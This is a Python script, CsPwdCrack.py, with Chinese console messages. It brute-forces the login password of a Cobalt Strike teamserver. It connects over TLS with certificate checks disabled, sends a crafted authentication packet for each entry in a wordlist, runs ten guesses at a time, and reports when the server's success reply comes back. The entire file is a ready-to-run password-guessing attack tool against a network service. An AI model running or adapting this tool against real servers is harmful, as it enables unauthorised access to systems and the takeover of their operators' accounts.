#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author   : R0A1NG
# @link     : https://www.roaing.com/
# @File     : CsPwdCrack.py
# @Time     : 2022/4/10 20:57
import socket
import ssl
import sys
import argparse
from gevent import monkey
import gevent.pool

monkey.patch_all()


class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            try:
                self.ssl_sock.connect((ipaddress, port))
            except:
                sys.exit('目标连接错误，请注意IP或端口是否正确')
        else:
            try:
                self.ssl_sock.connect((hostname, port))
            except:
                sys.exit('目标连接错误，请注意IP或端口是否正确')

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer


def passwordcheck(host, port, password):
    result = None
    conn = Connector()
    conn.open(host, port)
    payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
        bytes(password, "ascii").ljust(256, b"A"))
    conn.send(payload)
    if conn.is_connected():
        result = conn.receive()
    if conn.is_connected():
        conn.close()
    if result == bytearray(b"\x00\x00\xca\xfe"):
        print('password：{}, True'.format(password))
        sys.exit('密码爆破成功，密码：{}'.format(password))
    else:
        print('password：{}, False'.format(password))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-host", dest="host", default=None, type=str, help="Cobaltstrike IP")
    parser.add_argument("-port", dest="port", default=50050, type=int, help="Teamserver PORT（default：50050）")
    parser.add_argument("-wordlist", dest="wordlist", default=None, type=str, help="Password dictionary")
    args = parser.parse_args()
    if not args.host or not args.wordlist:
        sys.exit('缺少 host 或 wordlist\n示例：python3 CsPwdCrack.py -host 127.0.0.1 -port 50050 -wordlist password.txt')
    try:
        f = open(args.wordlist, 'r').readlines()
    except:
        sys.exit('密码字典文件：{}，打开失败！'.format(args.wordlist))
    g = gevent.pool.Pool(10)
    run_list = []
    for i in f:
        password = i.split()[0]
        run_list.append(g.spawn(passwordcheck, args.host, args.port, password))
    gevent.joinall(run_list)
